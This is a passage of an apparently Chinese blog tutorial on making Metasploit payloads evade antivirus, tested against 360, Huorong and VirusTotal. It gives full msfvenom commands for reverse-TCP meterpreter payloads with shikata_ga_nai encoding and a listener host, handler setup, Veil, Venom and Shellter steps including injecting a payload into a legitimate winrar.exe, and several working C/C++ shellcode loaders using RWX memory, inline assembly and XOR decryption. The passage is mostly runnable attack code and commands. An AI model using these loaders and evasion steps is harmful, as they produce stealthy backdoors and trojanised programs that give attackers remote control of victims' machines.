src=\"/./images/202205271013133.png\" alt=\"image-20220527101335024\"></p>\n<h3 id=\"使用veil-mingw-w64-VT查杀率11-69\"><a href=\"#使用veil-mingw-w64-VT查杀率11-69\" class=\"headerlink\" title=\"使用veil+mingw-w64(VT查杀率11&#x2F;69)\"></a>使用veil+mingw-w64(VT查杀率11&#x2F;69)</h3><p>先用veil生成shellcode</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># veil</span><br><span class=\"line\">Veil&gt; use 1\t\t\t\t\t\t\t\t# 选择使用 Veil-Evasion 模块</span><br><span class=\"line\">Veil/Evasion&gt; use 7\t\t\t\t\t\t# 选择payload  c/meterpreter/rev_tcp.py</span><br><span class=\"line\">[cs/meterpreter/rev_tcp&gt;&gt;] set LHOST 192.168.174.128</span><br><span class=\"line\">[cs/meterpreter/rev_tcp&gt;&gt;] set LPORT 6666</span><br><span class=\"line\">[cs/meterpreter/rev_tcp&gt;&gt;] generate</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/./images/202205271016580.png\" alt=\"image-20220527101615402\"></p>\n<p>输入生成文件名为<code>c_msf</code>：</p>\n<p><img src=\"/./images/202205271016611.png\" alt=\"image-20220527101633513\"></p>\n<p>先生成一个可以被 msf 利用的 <code>c_msf.c</code> 然后用mingw-w64 来编译。</p>\n<p>mingw-w64的安装可参考：<a href=\"https://zhuanlan.zhihu.com/p/76613134\">https://zhuanlan.zhihu.com/p/76613134</a></p>\n<p>若编译报错，可以尝试指定库，生成可执行文件a.exe：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc c_msf.c -lws2_32</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/./images/202205271121046.png\" alt=\"image-20220527112104971\"></p>\n<p>360和火绒均可以查杀（原po全程开启360卫士和杀毒以及火绒，编译、运行、上线都没有问题）。</p>\n<p>在virustotal.com上查杀率为11&#x2F;69（原po为23&#x2F;71）。Bypass了McAfee。</p>\n<p>360：</p>\n<p><img src=\"/./images/202205271124553.png\" alt=\"image-20220527112426483\"></p>\n<p>火绒：</p>\n<p><img src=\"/./images/202205271122178.png\" alt=\"image-20220527112257096\"></p>\n<p>VT：</p>\n<p><img src=\"/./images/202205271126466.png\" alt=\"image-20220527112633347\"></p>\n<h2 id=\"Venom免杀\"><a href=\"#Venom免杀\" class=\"headerlink\" title=\"Venom免杀\"></a>Venom免杀</h2><p>Venom利用msfvenom（metasploit）生成不同的格式的shellcode，如（c | python | ruby | dll | msi | hta-psh）等，然后将生成的shellcode注入一个模板（例如：python），并使用类似gcc、mingw32或pyinstaller之类的编译器生成可执行文件。</p>\n<p>Venom的一些功能还会直接调用<code>Veil-Evasion.py</code>，<code>unicorn.py</code>，<code>powersploit.py</code>等来直接创建免杀程序，避免重复造轮子。</p>\n<h3 id=\"安装Venom\"><a href=\"#安装Venom\" class=\"headerlink\" title=\"安装Venom\"></a>安装Venom</h3><p>venom安装和运行必须是在图形界面下，如果是ssh终端连接到kali进行连接是不行的。venom依赖的软件比较多，所以安装出现问题是很正常的。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Zenity | Metasploit | GCC (compiler) | Pyinstaller (compiler)</span><br><span class=\"line\">mingw32 (compiler) | pyherion.py (crypter) | wine (emulator)</span><br><span class=\"line\">PEScrambler.exe (PE obfuscator) | apache2 (webserver)| winrar (wine)</span><br><span class=\"line\">vbs-obfuscator (obfuscator) | avet (Daniel Sauder) | shellter (KyRecon)</span><br><span class=\"line\">ettercap (MitM + DNS_Spoofing) | encrypt_PolarSSL (AES crypter)</span><br></pre></td></tr></table></figure>\n\n<p>从github上拖到本地</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone https://github.com/r00t-3xp10it/venom.git</span><br></pre></td></tr></table></figure>\n\n<p>修改文件执行权限</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd venom</span><br><span class=\"line\">sudo chmod -R +x *.sh</span><br><span class=\"line\">sudo chmod -R +x *.py</span><br></pre></td></tr></table></figure>\n\n<p>安装依赖库和软件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd aux</span><br><span class=\"line\">sudo ./setup.sh</span><br></pre></td></tr></table></figure>\n\n<p>运行venom，代码高亮有些问题，但是问题不大，还是可以用的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo ./venom.sh</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/./images/202205271736471.png\" alt=\"image-20220527173623380\"></p>\n<h3 id=\"venom生成exe-VT查杀率35-68\"><a href=\"#venom生成exe-VT查杀率35-68\" class=\"headerlink\" title=\"venom生成exe(VT查杀率35&#x2F;68)\"></a>venom生成exe(VT查杀率35&#x2F;68)</h3><p>启动venom:<code>sudo ./venom.sh</code>，然后选择windows，也就是2，然后会列出所有windows可用的20个agent。</p>\n<p><img src=\"/./images/202205271737599.png\" alt=\"image-20220527173757520\"></p>\n<p>支持的种类还是比较全面的，shellter、avet等免杀工具都内置在里面了，而且支持很多种类似的payload格式。</p>\n<p>先生成一个最简单直接的，第4个模块，通过C编译EXE程序。</p>\n<p>在输入4之后，会弹出一个框让你输入ip地址，这个就是你msf监听主机的地址：</p>\n<p><img src=\"/./images/202205271739076.png\" alt=\"image-20220527173929002\"></p>\n<p>然后输入端口号之后，选择payload，选择最常规的<code>windows/meterperter/reverse_tcp</code>。</p>\n<p>输入一个文件名，例如notepad。</p>\n<p><img src=\"/./images/202205271740284.png\" alt=\"image-20220527174056207\"></p>\n<p>然后在编译和生成exe的过程中，会弹出来两个选项框，一般默认就行。</p>\n<p>之后会提示已经生成，并询问你如何分发payload，直接在测试机上执行就行了，可见output文件夹已经生成了notepad.exe。</p>\n<p><img src=\"/./images/202205271742310.png\" alt=\"image-20220527174259258\"></p>\n<p>360和火绒均可以查杀（原po360静态检测没问题，但行为检测能查杀出为病毒；火绒则静态+动态都没有检测到）。</p>\n<p>在virustotal.com上查杀率为35&#x2F;68（原po为19&#x2F;71）。</p>\n<p>360：</p>\n<p><img src=\"/./images/202205271800602.png\" alt=\"image-20220527180055539\"></p>\n<p>火绒：</p>\n<p><img src=\"/./images/202205271801624.png\" alt=\"image-20220527180138530\"></p>\n<p>VT：</p>\n<p><img src=\"/./images/202205271804004.png\" alt=\"image-20220527180452891\"></p>\n<h3 id=\"venom生成dll-VT查杀率11-70\"><a href=\"#venom生成dll-VT查杀率11-70\" class=\"headerlink\" title=\"venom生成dll(VT查杀率11&#x2F;70)\"></a>venom生成dll(VT查杀率11&#x2F;70)</h3><p>选择windows之后，在agent中选择第1个，生成dll。</p>\n<p><img src=\"/./images/202205271807146.png\" alt=\"image-20220527180740091\"></p>\n<p>后面的操作和上面那个差不多，然后就能看到生成了<code>notepad.dll</code>文件。</p>\n<p>原po将文件拷贝到测试机上，命令行中执行<code>rundll32.exe notepad.dll,main</code>，可动静态免杀过360和火绒。msf正常上线。在virustotal.com上查杀率为11&#x2F;71。</p>\n<p>本文复现时出现问题：</p>\n<p><img src=\"/./images/202205271815246.png\" alt=\"image-20220527181539179\"></p>\n<h2 id=\"Shellter免杀\"><a href=\"#Shellter免杀\" class=\"headerlink\" title=\"Shellter免杀\"></a>Shellter免杀</h2><p>注意：</p>\n<ul>\n<li>shellter目前只能注入32位的可执行文件</li>\n<li>shellter需要管理员权限运行</li>\n</ul>\n<h3 id=\"安装Shellter\"><a href=\"#安装Shellter\" class=\"headerlink\" title=\"安装Shellter\"></a>安装Shellter</h3><p>ubuntu系统中apt安装：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get update</span><br><span class=\"line\">apt-get install shellter</span><br><span class=\"line\">dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32</span><br></pre></td></tr></table></figure>\n\n<p>kali中不是很好用，windows中手动下载手动下载：</p>\n<p>官方下载站点<code>https://www.shellterproject.com/download/</code>，下载后解压，无需安装，cmd下可直接使用。</p>\n<p><img src=\"/./images/202205271824223.png\" alt=\"image-20220527182416161\"></p>\n<h3 id=\"生成payload（VT免杀率7-69\"><a href=\"#生成payload（VT免杀率7-69\" class=\"headerlink\" title=\"生成payload（VT免杀率7&#x2F;69)\"></a>生成payload（VT免杀率7&#x2F;69)</h3><p>需要提前准备一个PE文件作为被注入程序。用之前选的<code>putty.exe</code>来进行测试。</p>\n<p>必须使用32位PE文件，下载一个32位putty.exe：</p>\n<p><img src=\"/./images/202205271827287.png\" alt=\"image-20220527182755237\"></p>\n<p>之后程序会把<code>putty.exe</code>进行备份，因为生成的payload会自动覆盖原来的<code>putty.exe</code>。</p>\n<p>但<code>putty-32.exe</code>生成报错，换了一个32位可执行文件<code>winrar.exe</code>：</p>\n<p><img src=\"/./images/202205271850186.png\" alt=\"image-20220527185054107\"></p>\n<p>选项<code>Enable Stealth Mode</code>，是否启用隐身模式，启用后免杀效果会变差，建议不启用。</p>\n<p>还是选择<code>windows/meterpreter/reverse_tcp</code>作为payload</p>\n<p><img src=\"/./images/202205271852105.png\" alt=\"image-20220527185214043\"></p>\n<p>全程自动化生成，最终的生成文件会替换原来的<code>winrar.exe</code>。</p>\n<p>通过对比可发现程序稍微变大了</p>\n<p>在msf中使用<code>handler -H 192.168.174.128 -P 6666 -p windows/meterpreter/reverse_tcp</code>进行监听</p>\n<p>360和火绒均可查杀（原po执行360和火绒均可免杀，msf正常上线）。</p>\n<p>在virustotal.com上查杀率为12&#x2F;65，Bypass了卡巴、瑞星（原po为7&#x2F;69，卡巴、瑞星、微软三个都没bypass）。</p>\n<p>360：</p>\n<p><img src=\"/./images/202205271854112.png\" alt=\"image-20220527185452045\"></p>\n<p>火绒：</p>\n<p><img src=\"/./images/202205271856578.png\"></p>\n<p>VT：</p>\n<p><img src=\"/./images/202205271902073.png\" alt=\"image-20220527190242985\"></p>\n<h2 id=\"C、C-加载shellcode\"><a href=\"#C、C-加载shellcode\" class=\"headerlink\" title=\"C、C++加载shellcode\"></a>C、C++加载shellcode</h2><p>以上很多方法都是使用msfvenom生成shellcode，然后对shellcode进行混淆、编码等各种处理，最终再使用各种语言进行编译或加载。而被用到的最多的语言就是C&#x2F;C++、C#和python。</p>\n<p>C&#x2F;C++加载shellcode手工编译的方法，一般分为两种方式：</p>\n<ol>\n<li><p>C&#x2F;C++源码+shellcode直接编译，其中对shellcode的执行可以使用函数指针执行、汇编指令执行、申请动态内存等方式，且shellcode可进行一些加密混淆处理；比如免杀工具veil和Venom都是使用了类似的方法。</p>\n</li>\n<li><p>使用加载器加载C&#x2F;C++代码，如shellcode_launcher之类。</p>\n</li>\n</ol>\n<h3 id=\"方法1-msf直接生成exe（VT免杀率51-69）\"><a href=\"#方法1-msf直接生成exe（VT免杀率51-69）\" class=\"headerlink\" title=\"方法1 msf直接生成exe（VT免杀率51&#x2F;69）\"></a>方法1 msf直接生成exe（VT免杀率51&#x2F;69）</h3><p>这是最简单的一种加载shellcode的方法，直接使用msfvenom生成c语言的shellcode，为了提高免杀效果，使用了<code>shikata_ga_nai</code>编码器。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#x27;\\x00&#x27; lhost=192.168.174.128 lport=6666  -f exe -o shellcode1.exe</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/./images/202205301154200.png\" alt=\"image-20220530115440059\"></p>\n<p>在msf中进行监听：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msf6 &gt; use multi/handler</span><br><span class=\"line\">msf6 &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class=\"line\">msf6 &gt; set LHOST 192.168.174.128</span><br><span class=\"line\">msf6 &gt; set LPORT 6666</span><br><span class=\"line\">msf6 &gt; set EnableStageEncoding true</span><br></pre></td></tr></table></figure>\n\n<p>然后执行生成的<code>shellcode1.exe</code>，msf中可正常上线：</p>\n<p><img src=\"/./images/202205301154538.png\" alt=\"image-20220530115427316\"></p>\n<p>360和火绒均可查杀，在virustotal.com上查杀率为51&#x2F;69。</p>\n<p>360：</p>\n<p><img src=\"/./images/202205301155110.png\" alt=\"image-20220530115531047\"></p>\n<p>火绒：</p>\n<p><img src=\"/./images/202205301156409.png\" alt=\"image-20220530115635342\"></p>\n<p>VT：</p>\n<p><img src=\"/./images/202205301157438.png\" alt=\"image-20220530115749310\"></p>\n<h3 id=\"方法2-申请动态内存加载（VT免杀率36-69）\"><a href=\"#方法2-申请动态内存加载（VT免杀率36-69）\" class=\"headerlink\" title=\"方法2 申请动态内存加载（VT免杀率36&#x2F;69）\"></a>方法2 申请动态内存加载（VT免杀率36&#x2F;69）</h3><p>下面的代码会申请一段动态内存，然后加载shellcode。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;Windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">pragma</span> comment(linker,<span class=\"string\">&quot;/subsystem:\\&quot;Windows\\&quot; /entry:\\&quot;mainCRTStartup\\&quot;&quot;</span>) <span class=\"comment\">//windows控制台程序不出黑窗口</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">char</span> shellcode[] =</span><br><span class=\"line\"><span class=\"string\">&quot;shellcode&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"comment\">// 原po此处内存报错，已修改</span></span><br><span class=\"line\">    LPVOID Memory;</span><br><span class=\"line\"></span><br><span class=\"line\">    Memory=VirtualAlloc(<span class=\"literal\">NULL</span>, <span class=\"keyword\">sizeof</span>(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">memcpy</span>(Memory, shellcode, <span class=\"keyword\">sizeof</span>(shellcode));</span><br><span class=\"line\"></span><br><span class=\"line\">    ((<span class=\"type\">void</span>(*)())Memory)();</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>visual studio 2019进行编译，关闭杀软，msf中可正常上线：</p>\n<p><img src=\"/./images/202205301349630.png\" alt=\"image-20220530134959565\"></p>\n<p>打开杀软，360和火绒均可查杀（原po火绒静态和动态都可查杀，360杀毒和卫士没有反应）。</p>\n<p>virustotal.com上查杀率为36&#x2F;69（原po为24&#x2F;71）。</p>\n<p>受控机没有C环境，执行时缺少<code>VCRUNTIME140D.dll</code>和<code>ucrtbased.dll</code>，需要手动安装。</p>\n<p><img src=\"/./images/202205301354403.png\" alt=\"image-20220530135423356\"></p>\n<p>360：</p>\n<p><img src=\"/./images/202205301355884.png\" alt=\"image-20220530135541816\"></p>\n<p>火绒：</p>\n<p><img src=\"/./images/202205301352552.png\" alt=\"image-20220530135217482\"></p>\n<p>VT：</p>\n<p><img src=\"/./images/202205301400718.png\" alt=\"image-20220530140029621\"></p>\n<h3 id=\"方法3-嵌入汇编加载（VT免杀率36-69）\"><a href=\"#方法3-嵌入汇编加载（VT免杀率36-69）\" class=\"headerlink\" title=\"方法3 嵌入汇编加载（VT免杀率36&#x2F;69）\"></a>方法3 嵌入汇编加载（VT免杀率36&#x2F;69）</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">pragma</span> comment(linker, <span class=\"string\">&quot;/section:.data,RWE&quot;</span>)</span></span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">char</span> shellcode[] =<span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        __asm</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        mov eax, offset shellcode</span><br><span class=\"line\">        jmp eax</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在vs2019中编译执行，关闭杀软，msf中可正常上线。</p>\n<p>打开杀软，火绒和360均可查杀（原po火绒静态可查杀但是行为检测没报警，360杀毒和卫士没有反应，直接上线）。</p>\n<p>virustotal.com上查杀率为36&#x2F;69（原po为12&#x2F;71）。</p>\n<p>360：</p>\n<p><img src=\"/./images/202205301413445.png\" alt=\"image-20220530141332388\"></p>\n<p>火绒：</p>\n<p><img src=\"/./images/202205301414456.png\" alt=\"image-20220530141410368\"></p>\n<p>VT：</p>\n<p><img src=\"/./images/202205301417844.png\" alt=\"image-20220530141716720\"></p>\n<h3 id=\"方法4-强制类型转换（VT免杀率34-68）\"><a href=\"#方法4-强制类型转换（VT免杀率34-68）\" class=\"headerlink\" title=\"方法4 强制类型转换（VT免杀率34&#x2F;68）\"></a>方法4 强制类型转换（VT免杀率34&#x2F;68）</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;windows.h&gt;</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">unsigned char shellcode[] =&quot;&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">void main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">   ((void(WINAPI*)(void))&amp;shellcode)();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>打开杀软测试，360和火绒均可查杀，但360是在上线后几分钟后才检测出来的（原po静态+动态都没问题，可正常上线）。</p>\n<p>virustotal.com上查杀率为34&#x2F;68（原po为9&#x2F;70）。</p>\n<p><img src=\"/./images/202205301425472.png\" alt=\"image-20220530142524357\"></p>\n<h3 id=\"方法5-汇编花指令-VT免杀率37-69\"><a href=\"#方法5-汇编花指令-VT免杀率37-69\" class=\"headerlink\" title=\"方法5 汇编花指令(VT免杀率37&#x2F;69)\"></a>方法5 汇编花指令(VT免杀率37&#x2F;69)</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">pragma</span> comment(linker, <span class=\"string\">&quot;/section:.data,RWE&quot;</span>)</span></span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">char</span> shellcode[] =<span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    __asm</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        mov eax, offset shellcode</span><br><span class=\"line\">        _emit <span class=\"number\">0xFF</span>  </span><br><span class=\"line\">        _emit <span class=\"number\">0xE0</span></span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>打开杀软，火绒可查杀，<strong>360不可查杀</strong>（原po火绒静态可查杀但是行为检测没报警，360杀毒和卫士没有反应，直接上线）。</p>\n<p>virustotal.com上查杀率为37&#x2F;69（原po为12&#x2F;69）。</p>\n<p><img src=\"/./images/202205301430315.png\" alt=\"image-20220530143025208\"></p>\n<h3 id=\"方法6-xor加密（VT免杀率21-69）\"><a href=\"#方法6-xor加密（VT免杀率21-69）\" class=\"headerlink\" title=\"方法6 xor加密（VT免杀率21&#x2F;69）\"></a>方法6 xor加密（VT免杀率21&#x2F;69）</h3><p>需要使用一个工具<code>https://github.com/Arno0x/ShellcodeWrapper</code>，原项目为python2，在此基础上修改了一个python3版本<a href=\"https://github.com/Threekiii/Awesome-Redteam/tree/master/scripts/ShellcodeWrapper\">ShellcodeWrapper</a>。</p>\n<p>先用msfvenom生成一个raw格式的shellcode</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#x27;\\x00&#x27; lhost=192.168.174.128 lport=6666  -f raw &gt; shellcode.raw</span><br></pre></td></tr></table></figure>\n\n<p>在<code>ShellcodeWrapper</code>文件夹中执行下面命令，其中<code>threekiii</code>为自己设置的key。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python shellcode_encoder.py -cpp -cs -py shellcode.raw threekiii xor</span><br></pre></td></tr></table></figure>\n\n<p>生成了三个文件，一个为C++源码，也是下面要用到的，一个为C#源码，可以使用csc.exe进行加载，还有一个py文件，可直接执行也可以编译成py-exe执行。</p>\n<p><img src=\"/./images/202205301450337.png\" alt=\"image-20220530145037208\"></p>\n<p>其中<code>encryptedShellcodeWrapper_xor.cpp</code>文件中的C++源码如下，稍作修改，删除依赖库：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">Author: Arno0x0x, Twitter: @Arno0x0x</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 删除#include &quot;stdafx.h&quot;</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> **argv)</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Encrypted shellcode and cipher key obtained from shellcode_encoder.py</span></span><br><span class=\"line\">    <span class=\"type\">char</span> encryptedShellcode[] = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">    <span class=\"type\">char</span> key[] = <span class=\"string\">&quot;tidesec&quot;</span>;</span><br><span class=\"line\">    <span class=\"type\">char</span> cipherType[] = <span class=\"string\">&quot;xor&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Char array to host the deciphered shellcode</span></span><br><span class=\"line\">    <span class=\"type\">char</span> shellcode[<span class=\"keyword\">sizeof</span> encryptedShellcode];</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// XOR decoding stub using the key defined above must be the same as the encoding key</span></span><br><span class=\"line\">    <span class=\"type\">int</span> j = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"keyword\">sizeof</span> encryptedShellcode; i++) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (j == <span class=\"keyword\">sizeof</span> key - <span class=\"number\">1</span>) j = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        shellcode[i] = encryptedShellcode[i] ^ key[j];</span><br><span class=\"line\">        j++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Allocating memory with EXECUTE writes</span></span><br><span class=\"line\">    <span class=\"type\">void</span> *exec = VirtualAlloc(<span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span> shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Copying deciphered shellcode into memory as a function</span></span><br><span class=\"line\">    <span class=\"built_in\">memcpy</span>(exec, shellcode, <span class=\"keyword\">sizeof</span> shellcode);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Call the shellcode</span></span><br><span class=\"line\">    ((<span class=\"type\">void</span>(*)())exec)();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>vs2019编译执行，关闭杀软，msf中可正常上线：</p>\n<p><img src=\"/./images/202205301453694.png\" 